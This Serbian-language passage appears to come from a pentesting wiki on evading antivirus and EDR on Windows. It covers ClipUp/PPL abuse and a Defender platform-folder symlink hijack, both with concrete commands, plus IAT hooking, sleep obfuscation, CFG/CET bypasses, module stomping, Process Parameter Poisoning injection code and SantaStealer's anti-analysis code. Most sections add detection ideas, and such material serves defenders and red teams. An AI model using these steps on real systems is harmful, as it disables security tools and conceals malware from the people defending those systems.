- **Sysmon 15:** kreiranje `.sys:changelist` je univerzalno za BTR staging. `.dat` ADS pridružen istom `.sys` je naročito sumnjiv zato što legitimni Defender obično postavlja povratne informacije u `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 bez System 7045:** korelišite direktno kreiranje `HKLM\SYSTEM\CurrentControlSet\Services\<random>` koje sadrži `Args=...:changelist` i `Group=Boot Bus Extender`, bez odgovarajućeg SCM installation event-a.
- **Sysmon 6 -> 23:** korelišite učitavanje poznatog BTR drivera koji nije iz Defender porekla sa naknadnim brisanjem datoteke koje se pripisuje procesu `System`/PID 4, naročito kada su u pitanju security binarne datoteke.
- **Sysmon 11 -> 23:** generišite alert za brzo kreiranje i brisanje `\SystemRoot\Temp\BootClean.log` od strane procesa `System`/PID 4.
- Ograničite i auditujte dodelu/omogućavanje privilegije `SeLoadDriverPrivilege`; sam Microsoft potpis nije dovoljan osnov za poverenje kada se driver security alata staging-uje putem `cmd.exe`, PowerShell-a ili nepoznatog procesa.

## Zloupotreba Protected Process Light (PPL) za menjanje AV/EDR-a pomoću LOLBIN-ova

Protected Process Light (PPL) primenjuje hijerarhiju signer/level tako da samo protected procesi jednakog ili višeg nivoa mogu menjati jedni druge. Ofanzivno, ako možete legitimno pokrenuti PPL-enabled binarnu datoteku i kontrolisati njene argumente, možete benignu funkcionalnost (npr. logging) pretvoriti u ograničeni write primitive podržan PPL-om, usmeren na zaštićene direktorijume koje koriste AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Šta omogućava procesu da radi kao PPL
- Ciljni EXE (i sve učitane DLL datoteke) mora biti potpisan PPL-capable EKU-om.
- Proces mora biti kreiran pomoću CreateProcess sa flagovima: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Mora biti zatražen kompatibilan protection level koji odgovara signer-u binarne datoteke (npr. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` za anti-malware signere, `PROTECTION_LEVEL_WINDOWS` za Windows signere). Pogrešni nivoi će dovesti do neuspešnog kreiranja.

Širi uvod u PP/PPL i LSASS protection pogledajte ovde:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Alati za pokretanje
- Open-source pomoćni alat: CreateProcessAsPPL (bira protection level i prosleđuje argumente ciljnom EXE-u):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Obrazac korišćenja:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Potpisani sistemski binary `C:\Windows\System32\ClipUp.exe` sam se pokreće i prihvata parametar za upis log fajla na putanju koju zada caller.
- Kada se pokrene kao PPL process, upis fajla se izvršava uz PPL podršku.
- ClipUp ne može da parsira putanje koje sadrže razmake; koristite kratke 8.3 putanje za pokazivanje na zaštićene lokacije.

8.3 helpers za kratke putanje
- Izlistajte kratka imena: `dir /x` u svakom parent direktorijumu.
- Izvedite kratku putanju u cmd-u: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Lanac zloupotrebe (apstraktno)
1) Pokrenite PPL-capable LOLBIN (ClipUp) sa `CREATE_PROTECTED_PROCESS` koristeći launcher (npr. CreateProcessAsPPL).
2) Prosledite ClipUp argument za putanju log fajla kako biste prinudili kreiranje fajla u zaštićenom AV direktorijumu (npr. Defender Platform). Po potrebi koristite kratka 8.3 imena.
3) Ako je ciljni binary obično otvoren/zaključan od strane AV-a dok radi (npr. MsMpEng.exe), zakažite upis pri boot-u, pre pokretanja AV-a, instaliranjem auto-start service-a koji se pouzdano pokreće ranije. Potvrdite redosled pri boot-u pomoću Process Monitor-a (boot logging).
4) Nakon reboot-a, upis podržan PPL-om izvršava se pre nego što AV zaključa svoje binary-je, čime se ciljni fajl oštećuje i sprečava pokretanje.

Primer invocation-a (putanje su uklonjene/skraćene radi bezbednosti):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Napomene i ograničenja
- Ne možete kontrolisati sadržaj koji ClipUp upisuje, osim mesta upisa; primitive je pogodniji za korupciju nego za precizno ubacivanje sadržaja.
- Zahteva lokalne administratorske/SYSTEM privilegije za instaliranje/pokretanje servisa i period predviđen za reboot.
- Tajming je kritičan: ciljna datoteka ne sme biti otvorena; izvršavanje tokom boot-a izbegava file lock-ove.

Detekcije
- Kreiranje procesa `ClipUp.exe` sa neuobičajenim argumentima, naročito kada ga pokreću nestandardni launcheri, u periodu oko boot-a.
- Novi servisi podešeni za automatsko pokretanje sumnjivih binarnih datoteka, koji se dosledno pokreću pre Defender/AV-a. Ispitajte kreiranje/izmenu servisa pre otkazivanja pokretanja Defender-a.
- File integrity monitoring Defender binarnih datoteka/Platform direktorijuma; neočekivano kreiranje/izmena datoteka od strane procesa sa protected-process zastavicama.
- ETW/EDR telemetrija: potražite procese kreirane sa `CREATE_PROTECTED_PROCESS` i anomalnu upotrebu PPL nivoa od strane binarnih datoteka koje nisu AV.

Mere zaštite
- WDAC/Code Integrity: ograničite koje potpisane binarne datoteke mogu da se pokreću kao PPL i pod kojim parent procesima; blokirajte pozivanje ClipUp-a izvan legitimnih konteksta.
- Service hygiene: ograničite kreiranje/izmenu servisa koji se automatski pokreću i nadzirite manipulisanje redosledom pokretanja.
- Uverite se da su Defender tamper protection i early-launch zaštite omogućene; ispitajte greške pri pokretanju koje ukazuju na korupciju binarne datoteke.
- Razmotrite onemogućavanje generisanja 8.3 short-name naziva na volume-ima koji sadrže security tooling, ako je to kompatibilno sa vašim okruženjem (temeljno testirajte).

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender bira platformu iz koje se pokreće tako što enumeriše poddirektorijume unutar:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Bira poddirektorijum sa najvišim leksikografskim version string-om (npr. `4.18.25070.5-0`), a zatim odatle pokreće procese Defender servisa (u skladu s tim ažurirajući putanje servisa/registry-ja). Ovaj izbor veruje directory entry-jima, uključujući directory reparse points (symlink-ove). Administrator to može iskoristiti za preusmeravanje Defender-a na putanju u koju napadač može da upisuje i tako postići DLL sideloading ili ometanje rada servisa.<sup>[[21]](#references)[[22]](#references)</sup>

Preduslovi
- Lokalna administratorska prava (potrebna za kreiranje direktorijuma/symlink-ova unutar Platform foldera)
- Mogućnost reboot-a ili pokretanja ponovnog izbora Defender platforme (restart servisa pri boot-u)
- Potrebni su samo ugrađeni alati (mklink)

Zašto funkcioniše
- Defender blokira upis u sopstvene foldere, ali njegov izbor platforme veruje directory entry-jima i bira leksikografski najvišu verziju bez provere da li se cilj razrešava na zaštićenu/pouzdanu putanju.

Korak po korak (primer)
1) Pripremite writable clone trenutnog platform foldera, npr. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Kreirajte symlink direktorijuma sa višom verzijom unutar Platform koji pokazuje na vaš folder:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Izbor okidača (preporučuje se reboot):
```cmd
shutdown /r /t 0
```
4) Proverite da se MsMpEng.exe (WinDefend) pokreće iz preusmerene putanje:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Trebalo bi da uočite novu putanju procesa pod `C:\TMP\AV\` i konfiguraciju servisa/registry koji odražavaju tu lokaciju.

Opcije nakon eksploatacije
- DLL sideloading/code execution: Postavite/zamenite DLL datoteke koje Defender učitava iz svog direktorijuma aplikacije da biste izvršili kod u Defender procesima. Pogledajte prethodni odeljak: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Uklonite version-symlink kako se pri sledećem pokretanju konfigurisana putanja ne bi razrešila i Defender ne bi uspeo da se pokrene:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Imajte na umu da ova tehnika sama po sebi ne omogućava eskalaciju privilegija; zahtevaju se administratorska prava.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teamovi mogu premestiti runtime evasion iz C2 implanta direktno u ciljni modul tako što će zakačiti njegovu Import Address Table (IAT) i usmeriti odabrane API-je kroz napadačev, position-independent code (PIC). Ovo generalizuje evasion izvan malog API skupa koji mnogi kitovi izlažu (npr. CreateProcessA) i proširuje iste zaštite na BOFs i post-exploitation DLL-ove.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Pristup na visokom nivou
- Stage-ujte PIC blob zajedno sa ciljnim modulom koristeći reflective loader (prepending ili companion). PIC mora biti samostalan i position-independent.
- Kada se host DLL učita, prođite kroz njegov IMAGE_IMPORT_DESCRIPTOR i izmenite IAT unose za ciljane import-e (npr. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) tako da pokazuju na tanke PIC wrapper-e.
- Svaki PIC wrapper izvršava evasion radnje pre poziva realnog API-ja. Tipične evasion radnje uključuju:
- Maskiranje/unmaskiranje memorije oko poziva (npr. enkripcija beacon regiona, RWX→RX, promena naziva/dozvola stranice), a zatim vraćanje nakon poziva.
- Call-stack spoofing: konstruisanje benignog stack-a i prelazak u ciljni API tako da se pri analizi call stack-a dobiju očekivani frame-ovi.<sup>[[9]](#references)</sup>
- Radi kompatibilnosti, izvezite interfejs kako bi Aggressor script (ili ekvivalent) mogao da registruje API-je koje treba zakačiti za Beacon, BOFs i post-ex DLL-ove.

Zašto ovde koristiti IAT hooking
- Funkcioniše za svaki kod koji koristi zakačeni import, bez izmene koda alata ili oslanjanja na Beacon da proxy-je konkretne API-je.
- Pokriva post-ex DLL-ove: hooking LoadLibrary* omogućava presretanje učitavanja modula (npr. System.Management.Automation.dll, clr.dll) i primenu istog maskiranja/stack evasion-a na njihove API pozive.
- Vraća pouzdano korišćenje post-ex komandi za kreiranje procesa protiv detekcija zasnovanih na call stack-u, obmotavanjem CreateProcessA/W.

Minimalni IAT hook prikaz (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Napomene
- Primenite patch nakon relocations/ASLR-a, a pre prve upotrebe importa. Reflective loaderi poput TitanLdr/AceLdr demonstriraju hooking tokom DllMain-a učitanog modula.
- Wrappers treba da budu mali i PIC-safe; stvarni API razrešite pomoću originalne IAT vrednosti koju ste sačuvali pre patchovanja ili preko LdrGetProcedureAddress.
- Koristite RW → RX tranzicije za PIC i izbegavajte ostavljanje writable+executable stranica.

Stub za call-stack spoofing
- PIC stubovi u Draugr stilu prave lažni call chain (return addresses unutar benignih modula), a zatim prelaze u stvarni API.
- Ovo zaobilazi detekcije koje očekuju canonical stack-ove od Beacon/BOFs do osetljivih API-ja.
- Kombinujte sa tehnikama stack cutting/stack stitching da biste završili unutar očekivanih frame-ova pre API prologa.

Operativna integracija
- Dodajte reflective loader ispred post-ex DLL-ova kako bi se PIC i hooks automatski inicijalizovali prilikom učitavanja DLL-a.
- Koristite Aggressor script za registraciju ciljanih API-ja kako bi Beacon i BOFs transparentno koristili isti evasion path bez izmena koda.

Razmatranja za detekciju/DFIR
- Integritet IAT-a: entries koji se razrešavaju na non-image (heap/anon) adrese; periodična verifikacija import pointer-a.
- Anomalije stack-a: return addresses koji ne pripadaju učitanim image-ovima; nagli prelazi na non-image PIC; nedosledno RtlUserThreadStart poreklo.
- Telemetrija loader-a: writes unutar procesa u IAT, rana DllMain aktivnost koja menja import thunk-ove, neočekivani RX regioni kreirani pri učitavanju.
- Evasion učitavanja image-ova: ako se hook-uje LoadLibrary*, pratite sumnjiva učitavanja automation/clr assemblies povezana sa događajima masking-a memorije.

Povezani building blocks i primeri
- Reflective loaderi koji obavljaju IAT patching tokom učitavanja (npr. TitanLdr, AceLdr)
- Memory masking hooks (npr. simplehook) i stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stubovi (npr. Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks preko rezidentnog PICO-a

Ako kontrolišete reflective loader, možete hook-ovati importe **tokom `ProcessImports()`** tako što ćete zameniti loader-ov `GetProcAddress` pointer prilagođenim resolver-om koji prvo proverava hooks:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Napravite **resident PICO** (persistent PIC object) koji opstaje nakon što se transient loader PIC oslobodi.
- Export-ujte funkciju `setup_hooks()` koja prepisuje loader-ov import resolver (npr. `funcs.GetProcAddress = _GetProcAddress`).
- U funkciji `_GetProcAddress`, preskočite ordinal imports i koristite hash-based hook lookup poput `__resolve_hook(ror13hash(name))`. Ako hook postoji, vratite ga; u suprotnom prosledite poziv stvarnom `GetProcAddress`.
- Registrujte hook target-e u link time-u pomoću Crystal Palace `addhook "MODULE$Func" "hook"` entries. Hook ostaje validan jer se nalazi unutar resident PICO-a.

Ovo omogućava **import-time IAT redirection** bez patchovanja code section-a učitanog DLL-a nakon učitavanja.

### Prisiljavanje hookable importa kada target koristi PEB-walking

Import-time hooks se aktiviraju samo ako je funkcija zaista u IAT-u targeta. Ako modul razrešava API-je preko PEB-walk + hash mehanizma (bez import entry-ja), prisilite pravi import kako bi loader-ov `ProcessImports()` path mogao da ga vidi:

- Zamenite hashed export resolution (npr. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) direktnom referencom poput `&WaitForSingleObject`.
- Compiler generiše IAT entry, čime se omogućava interception kada reflective loader razrešava importe.

### Ekko-style sleep/idle obfuscation bez patchovanja `Sleep()` funkcije

Umesto patchovanja funkcije `Sleep`, hook-ujte **stvarne wait/IPC primitive** koje implant koristi (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Za duga čekanja, obmotajte poziv Ekko-style obfuscation chain-om koji encrypt-uje image u memoriji tokom idle perioda:<sup>[[31]](#references)[[27]](#references)</sup>

- Koristite `CreateTimerQueueTimer` za zakazivanje niza callbacks-a koji pozivaju `NtContinue` sa kreiranim `CONTEXT` frame-ovima.
- Tipičan chain (x64): postavite image na `PAGE_READWRITE` → RC4 encrypt preko `advapi32!SystemFunction032` nad celim mapped image-om → izvršite blocking wait → RC4 decrypt → **vratite permissions po sekcijama** prolaskom kroz PE sections → signalizujte završetak.
- `RtlCaptureContext` obezbeđuje template `CONTEXT`; klonirajte ga u više frame-ova i postavite registre (`Rip/Rcx/Rdx/R8/R9`) da pozovu svaki korak.

Operativni detalj: vratite “success” za duga čekanja (npr. `WAIT_OBJECT_0`) kako bi caller nastavio izvršavanje dok je image masked. Ovaj pattern skriva modul od scanner-a tokom idle windows-a i izbegava klasični potpis “patched `Sleep()`”.

Ideje za detekciju (zasnovano na telemetriji)
- Burst-ovi `CreateTimerQueueTimer` callbacks-a koji pokazuju na `NtContinue`.
- `advapi32!SystemFunction032` korišćen nad velikim, kontinualnim buffer-ima veličine image-a.
- `VirtualProtect` nad velikim range-om, nakon čega sledi custom obnavljanje permissions-a po sekcijama.

### Runtime CFG registracija gadget-a za sleep-obfuscation

Na CFG-enabled target-ima, prvi indirect jump ka mid-function gadget-u poput `jmp [rbx]` ili `jmp rdi` obično će oboriti proces sa `STATUS_STACK_BUFFER_OVERRUN`, jer gadget nije prisutan u CFG metadata-i modula. Da bi Ekko/Kraken-style chain-ovi ostali aktivni unutar hardened procesa:<sup>[[30]](#references)</sup>

- Registrujte svaku indirect destination koju chain koristi pomoću `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` i `CFG_CALL_TARGET_VALID` entries.
- Za adrese unutar učitanih image-ova (`ntdll`, `kernel32`, `advapi32`), `MEMORY_RANGE_ENTRY` mora počinjati na **image base-u** i obuhvatati **punu veličinu image-a**.
- Za manually mapped/PIC/stomped regione, koristite **allocation base** i umesto toga allocation size.
- Obeležite ne samo dispatch gadget, već i exports do kojih se dolazi indirektno (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls), kao i sve executable sections pod kontrolom napadača koje će postati indirect targets.

Ovo pretvara sleep chains u ROP/JOP stilu iz “radi samo u procesima bez CFG-a” u reusable primitive za `explorer.exe`, browsere, `svchost.exe` i druge endpointe compilovane sa `/guard:cf`.

### CET-safe stack spoofing za sleeping threads

Potpuna zamena `CONTEXT`-a je upadljiva i može prestati da radi na CET Shadow Stack sistemima, jer spoofed `Rip` i dalje mora da bude usklađen sa hardware shadow stack-om. Bezbedniji pattern za sleep-masking je:<sup>[[30]](#references)</sup>

- Izaberite drugu nit u istom procesu i pročitajte njene NT_TIB / TEB stack bounds (`StackBase`, `StackLimit`) preko `NtQueryInformationThread`.
- Sačuvajte trenutni TEB/TIB stvarne niti.
- Uhvatite stvarni sleeping context pomoću `GetThreadContext`.
- Kopirajte **samo stvarni `Rip`** u spoof context, ostavljajući spoofed `Rsp`/stack state netaknutim.
- Tokom sleep window-a, kopirajte spoof thread-ov `NT_TIB` u trenutni TEB kako bi stack walkers odmotavali stack unutar legitimnog stack range-a.
- Nakon završetka wait-a, vratite originalni TIB i thread context.

Ovo čuva CET-consistent instruction pointer, dok obmanjuje EDR stack walkers koji se oslanjaju na TEB stack metadata-u za validaciju unwind-ova.

### APC-based alternativa: Kraken Mask

Ako je timer-queue dispatch previše karakterističan, ista sleep-encrypt-spoof-restore sekvenca može se izvršiti iz suspended helper thread-a pomoću queued APC-ova:<sup>[[27]](#references)</sup>

- Kreirajte helper thread sa `NtTestAlert` kao entrypoint-om.
- Queue-ujte pripremljene `CONTEXT` frame-ove/APC-ove pomoću `NtQueueApcThread` i praznite ih pomoću `NtAlertResumeThread`.
- Čuvajte chain state na heap-u umesto na helper stack-u da biste izbegli iscrpljivanje podrazumevanog thread stack-a od 64 KB.
- Koristite `NtSignalAndWaitForSingleObject` da atomski signalizujete start event i blokirate se.
- Suspendujte main thread pre obnavljanja TIB/context-a (`NtSuspendThread` → restore → `NtResumeThread`) da biste smanjili race window tokom kog bi scanner mogao da uhvati delimično obnovljen stack.

Ovim se `CreateTimerQueueTimer` + `NtContinue` potpis zamenjuje helper-thread/APC potpisom, uz zadržavanje istih ciljeva RC4 masking-a i stack-spoofing-a.

Dodatne ideje za detekciju
- `NtSetInformationVirtualMemory` sa `VmCfgCallTargetInformation` neposredno pre sleep-ova, wait-ova ili APC dispatch-a.
- `GetThreadContext`/`SetThreadContext` obmotan oko `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` ili `ConnectNamedPipe`.
- `NtQueryInformationThread` nakon kog slede direktni writes u TEB/TIB stack bounds trenutne niti.
- `NtQueueApcThread`/`NtAlertResumeThread` chains koji indirektno dolaze do `SystemFunction032`, `VirtualProtect` ili helper-a za obnavljanje permissions-a po sekcijama.
- Ponovljena upotreba kratkih gadget signatures-a poput `FF 23` (`jmp [rbx]`) ili `FF E7` (`jmp rdi`) kao dispatch pivots unutar signed modules.


## Precision Module Stomping

Module stomping izvršava payload iz **`.text` section-a DLL-a koji je već mapiran unutar target procesa**, umesto alociranja očigledne private executable memorije ili učitavanja novog sacrificial DLL-a. Target za overwrite treba da bude **učitan, disk-backed image** čiji code space može da primi payload bez korumpiranja code path-ova koji su procesu i dalje potrebni.<sup>[[1]](#references)[[2]](#references)</sup>

### Pouzdan izbor targeta

Naive stomping nad uobičajenim modulima kao što su `uxtheme.dll` ili `comctl32.dll` je nepouzdan: DLL možda nije učitan u remote procesu, a premali code region će oboriti proces. Pouzdan workflow je:

1. Enumerišite module target procesa i zadržite **names-only include list** već učitanih DLL-ova.
2. Prvo izgradite payload i zabeležite njegovu **tačnu veličinu u bajtovima**.
3. Skenirajte candidate DLL-ove na disku i uporedite PE section **`.text` `Misc_VirtualSize`** sa veličinom payload-a. Ovo je važnije od veličine fajla jer odražava veličinu executable section-a **kada je mapiran u memoriju**.
4. Parsirajte **Export Address Table (EAT)** i izaberite RVA export-ovane funkcije kao stomp start offset.
5. Izračunajte **blast radius**: ako payload premašuje granicu izabrane funkcije, overwrite-ovaće susedne exports raspoređene nakon nje u memoriji.

Tipični recon/selection helpers koji se mogu videti u praksi:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
Operativne napomene
- Preferirajte DLL-ove koji su **već učitani** u udaljenom procesu kako biste izbegli telemetry za `LoadLibrary`/neočekivana učitavanja image-a.
- Preferirajte exporte koji se retko izvršavaju u ciljnoj aplikaciji; u suprotnom, uobičajeni code paths mogu pogoditi stomped bytes pre ili nakon kreiranja thread-a.
- Veliki implant-i često zahtevaju promenu načina ugrađivanja shellcode-a sa string literala na **byte-array/braced initializer**, kako bi ceo buffer bio ispravno predstavljen u injector source-u.

Ideje za detekciju
- Udaljeni upisi u **image-backed executable pages** (`MEM_IMAGE`, `PAGE_EXECUTE*`), umesto uobičajenijih private RWX/RX alokacija.
- Export entry points čiji se bytes u memoriji više ne podudaraju sa backing file-om na disku.
- Udaljeni thread-ovi ili context pivots koji počinju izvršavanje unutar legitimnog DLL export-a čiji su prvi bytes nedavno izmenjeni.
- Sumnjive sekvence `VirtualProtect(Ex)` / `WriteProcessMemory` nad DLL `.text` pages, nakon kojih sledi kreiranje thread-a.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) je tehnika **process-injection / EDR-evasion** koja izbegava klasični remote write path (`VirtualAllocEx` + `WriteProcessMemory`). Umesto kopiranja bytes-a u već pokrenuti target, ona iskorišćava činjenicu da Windows **kopira odabrane `CreateProcessW` startup parameters u child process** i skladišti ih unutar `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Poisonable carriers koje kopira `CreateProcessW`

Korisni carriers su:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (sa `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Praktična ograničenja carriers-a:

- `lpCommandLine` mora pokazivati na **writable memory** za `CreateProcessW`, a ograničen je na **32.767 Unicode karaktera**, uključujući null terminator.
- `lpEnvironment` mora biti Unicode environment block uzastopnih `NAME=VALUE\0` stringova, završen dodatnim `\0`.
- `lpReserved` je zvanično rezervisan, zato `ShellInfo` mapping treba tretirati kao implementation detail, a ne kao stabilan dokumentovani contract.

Ovo pretvara normalno kreiranje procesa u **payload-transfer primitive**. Operator kreira child process sa startup data pod kontrolom napadača i prepušta Windows-u da obavi cross-process copy.

### Remote lookup flow bez remote write API-ja

Nakon kreiranja child process-a, pronađite kopirani buffer koristeći **read-only** primitives:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → dobavite `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Pročitajte udaljeni `PEB`
3. Pratite `PEB.ProcessParameters`
4. Pročitajte `RTL_USER_PROCESS_PARAMETERS`
5. Koristite odabrani pointer:
- `parameters.CommandLine.Buffer`
- `parameters.Environment`
- `parameters.ShellInfo.Buffer`

Minimalni flow:
```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```
### Izvršavanje kopiranog bafera parametara

Kopirani region parametara je obično `RW`, a ne izvršan. Uobičajeni P3 chain je:

1. Kreirati proces na uobičajen način (ne suspendovan)
2. Učiniti izabranu stranicu parametara izvršivom pomoću `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Ponovo upotrebiti handle glavne niti koji je već vraćen u `PROCESS_INFORMATION`
4. Preusmeriti izvršavanje pomoću `NtSetContextThread` (`CONTEXT_CONTROL`, prepisati `RIP`)

Za razliku od klasičnih thread hijacking workflow-a, ovo **ne zahteva** `SuspendThread` / `ResumeThread`; kontekst se može direktno promeniti na vraćenom handle-u glavne niti.

Time se izbegava nekoliko API-ja koji se često nadziru zbog injection-a:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- često i `SuspendThread` / `ResumeThread`

### Ograničenje null-byte vrednosti i staged shellcode

Sva tri nosioca su **string ili string-like podaci**, pa se raw payload koji sadrži `0x00` skraćuje tokom prenosa. Praktično rešenje je **null-free first stage** koji rekonstruiše konstante tokom izvršavanja, a zatim učitava proizvoljni second stage.

Jednostavan obrazac je XOR-based constant synthesis:
```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```
Ovo omogućava da first stage izgradi stack stringove, API argumente, DLL putanje ili shellcode loader druge faze bez ugrađivanja null bajtova u transportovani parametar.

### Stack-based API pozivi iz first stage-a

Kada first stage mora da pozove API-je kao što je `LoadLibraryA`, može da:

- push-uje string/buffer na stack cilja
- rezerviše **32-byte x64 shadow space**
- postavi `RCX`, `RDX`, `R8`, `R9` na konstante ili pokazivače relativne u odnosu na `RSP`
- održi `RSP` **16-byte aligned** pre poziva

Second stage se zatim može kopirati sa stack-a u `PAGE_READWRITE` alokaciju, promeniti u `PAGE_EXECUTE_READ` pomoću `VirtualProtect` i izvršiti skokom, čime se izbegava direktna RWX alokacija.

### Ideje za detekciju

Dobre mogućnosti za hunting koje autori navode:

- `VirtualProtectEx` / `NtProtectVirtualMemory` koji stranice process parametara postavljaju kao executable
- ta promena zaštite praćena pozivom `SetThreadContext` / `NtSetContextThread`
- remote čitanja `PEB`, a zatim `RTL_USER_PROCESS_PARAMETERS`
- neuobičajeno dugi / high-entropy `lpCommandLine`, `lpEnvironment` ili `STARTUPINFO.lpReserved` vrednosti tokom kreiranja procesa

### Napomene

- P3 je **cross-process transfer trik**, a ne potpuna execution primitive sam po sebi: kopirani parametar i dalje zahteva promenu na execute-permission i metod za preusmeravanje izvršavanja.
- `RtlCreateProcessReflection` / Dirty Vanity autori su razmatrali, ali su ga odbacili zato što interno dolazi do sumnjivih primitives kao što su `NtWriteVirtualMemory` i `NtCreateThreadEx`.

## SantaStealer Tradecraft za Fileless Evasion i Credential Theft

SantaStealer (poznat i kao BluelineStealer) pokazuje kako moderni info-stealers objedinjuju AV bypass, anti-analysis i credential access u jednom workflow-u.<sup>[[24]](#references)</sup>

### Keyboard layout gating i sandbox delay

- Config flag (`anti_cis`) enumeriše instalirane keyboard layout-e pomoću `GetKeyboardLayoutList`. Ako se pronađe Cyrillic layout, sample kreira prazan `CIS` marker i terminira pre pokretanja stealers, čime obezbeđuje da se nikada ne aktivira na isključenim locale-ima, uz ostavljanje hunting artefakta.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Slojevita `check_antivm` logika

- Varijanta A prolazi kroz listu procesa, hešira svako ime prilagođenim rolling checksum-om i poredi ga sa ugrađenim blocklistama za debuggere/sandbox okruženja; ponavlja checksum nad imenom računara i proverava radne direktorijume kao što je `C:\analysis`.
- Varijanta B proverava sistemska svojstva (minimalan broj procesa, nedavno vreme pokretanja), poziva `OpenServiceA("VBoxGuest")` radi detekcije VirtualBox dodataka i obavlja vremenske provere oko funkcija za spavanje kako bi otkrila single-stepping. Svaki pogodak prekida izvršavanje pre pokretanja modula.

### Fileless helper + dvostruko ChaCha20 reflective učitavanje

- Primarni DLL/EXE sadrži Chromium credential helper koji se ili zapisuje na disk ili se ručno mapira u memoriju; u fileless režimu sam rešava importe/relokacije, pa se nikakvi artefakti helpera ne zapisuju.
- Taj helper čuva DLL druge faze dvaput šifrovan pomoću ChaCha20 (dva ključa od 32 bajta + nonce vrednosti od 12 bajtova). Nakon oba prolaza, reflectively učitava blob (bez `LoadLibrary`) i poziva exporte `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, izvedene iz [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
